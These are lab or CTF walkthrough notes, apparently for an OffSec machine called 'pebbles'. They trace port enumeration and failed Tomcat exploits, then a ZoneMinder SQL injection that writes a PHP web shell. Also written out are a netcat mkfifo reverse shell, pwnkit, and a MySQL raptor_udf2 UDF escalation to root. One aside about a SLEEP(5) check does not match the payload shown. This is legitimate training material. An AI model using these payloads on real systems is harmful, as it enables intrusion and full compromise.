## Initial Foothold
autorecon 192.168.228.52


port 21 (ftp) - anonymous login failed.
port 22 (ssh) - try out ssh brute.
port 3305 - online says its OFTP which has no anonymous login supported. Probably nothing.
Went to this and its actually a default ubuntu page. 
`http://192.168.228.52:3305/` 

port 80 & 8080 (web) - port 8080 is running tomcat apache. From searchsploit, tried `
`Apache Tomcat 11.0.3 - Remote Code Execution` (52134.py)
`Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)` (42966.py)
but both didnt work.

```
└─$ python2 42966.py -u http://192.168.228.52:8080
Poc Filename  Poc.jsp
Not Vulnerable to CVE-2017-12617 

└─$ python3 52134.py
[+] Exploit for CVE-2025-24813
[+] Made By Al Baradi Joy

Enter the target domain (e.g., http://localhost:8080): http://192.168.228.52:8080/
Enter your interactsh URL: http://192.168.45.216:4444
[+] Exploit for CVE-2025-24813
[+] Made By Al Baradi Joy

[+] Uploading payload to: {put_url}
[-] Upload failed with status: 405
```

Feroxbuster both ports to find its both running `/zm` which is ZoneMinder. Searchsploit for exploit.
Try `ZoneMinder Snapshots < 1.37.33 - Unauthenticated RCE` because its RCE (51902.py). Failed. It failed to get a csrf token.
```
└─$ python3 51902.py -t http://192.168.228.52:8080/zm -ip 192.168.45.216 -p 4444
[>] fetching csrt token
Traceback (most recent call last):
  File "/home/kali/offsec/pebbles/51902.py", line 60, in <module>
    ZoneMinderExploit(args.target_url).exploit(payload)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^
  File "/home/kali/offsec/pebbles/51902.py", line 44, in exploit
    if self.fetch_csrf_token():
       ~~~~~~~~~~~~~~~~~~~~~^^
  File "/home/kali/offsec/pebbles/51902.py", line 27, in fetch_csrf_token
    self.csrf_magic = self.get_csrf_magic(response)
                      ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^
  File "/home/kali/offsec/pebbles/51902.py", line 35, in get_csrf_magic
    return BeautifulSoup(response.text, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value', None)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'get'

## Curling to try to debug. But yielded nothing.
─(kali㉿kali)-[~/offsec/pebbles]
└─$ curl -s http://192.168.228.52/zm/index.php | grep -i csrf_magic
┌──(kali㉿kali)-[~/offsec/pebbles]
└─$ curl -s http://192.168.228.52:8080/zm/index.php | grep -i csrf_magic
```

Try `Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation / Cross-Site Request Forgery` (41239) since that is the version we are dealing with.

Open burpsuite.
```
Go to Proxy, turn on intercept, then head to http://192.168.228.52/zm/index.php

Forward the intercepted post request to repeater. Right click on the request and select "Change request method". This changes the request from a GET request to a POST request. The request will look like below.


POST /zm/index.php HTTP/1.1

Host: 192.168.228.52

Cache-Control: max-age=0

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=b7a5fgi4onpigs6tvaec158j52

Connection: keep-alive

Content-Type: application/x-www-form-urlencoded

Content-Length: 112



view=request&request=log&task=query&limit=100;(SELECT *
FROM (SELECT "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "/var/www/http/shell.php";)#&minTime=1466674406.084434
```

We will notice a slight wait of like 5 seconds because of `SLEEP(5)`. So we know the time-based sql is working. Send another post request to put up a shell. 

```
POST /zm/index.php HTTP/1.1

Host: 192.168.228.52

Cache-Control: max-age=0

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=b7a5fgi4onpigs6tvaec158j52

Connection: keep-alive

Content-Type: application/x-www-form-urlencoded

Content-Length: 161



view=request&request=log&task=query&limit=100;SELECT "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php";#&minTime=1466674406.084434
```

On port 3305 default page, it says `You should replace this file (located at /var/www/html/index.html)`. Thats why the file will most likely be found at port 3305. Try to get a reverse shell. 
```
## On Firefox
http://192.168.228.52:3305/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 

http://192.168.228.52:3305/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.45.216%203305%20%3E%2Ftmp%2Ff
```

Penelope port 4444 did not work. It seems like only open ports are allowed for reverse shell. We did penelope port 3305. Reverse shell caught.

## Privesc

Check SUID. Realised pkexec has SUID bits. Run pwnkit. Get root.

Alt path (intended):

Doing ps auxwww we see mysql running as root

Running MySQL as `root` ==creates a **severe security risk because any vulnerability in the database grants an attacker full administrative control over the entire operating system**==.

Doing the command mysql --version we see its running MySql 5.7
There is a privilege escalation exploit we can abuse for MySql:
```
https://www.exploit-db.com/exploits/1518

```

```
gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so 1518.o -lc
```

We transfer the raptor_udf2.so to our victim machine into the tmp folder using wget

```
POST /zm/index.php HTTP/1.1

Host: 192.168.228.52

Cache-Control: max-age=0

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=b7a5fgi4onpigs6tvaec158j52

Connection: keep-alive

Content-Type: application/x-www-form-urlencoded

Content-Length: 161

view=request&request=log&task=query&limit=100;create table foo(line blob); insert into foo values(load_file('/tmp/raptor_udf2.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  create function do_system returns integer soname 'raptor_udf2.so';
```

I killed my shell as www-data and set my netcat listener on port 3305 again

Now i’m going to abuse the created function to run the reverse shell I transferred earlier as root
`select do_system('/bin/bash /tmp/bash.sh');`

And we get our shell as root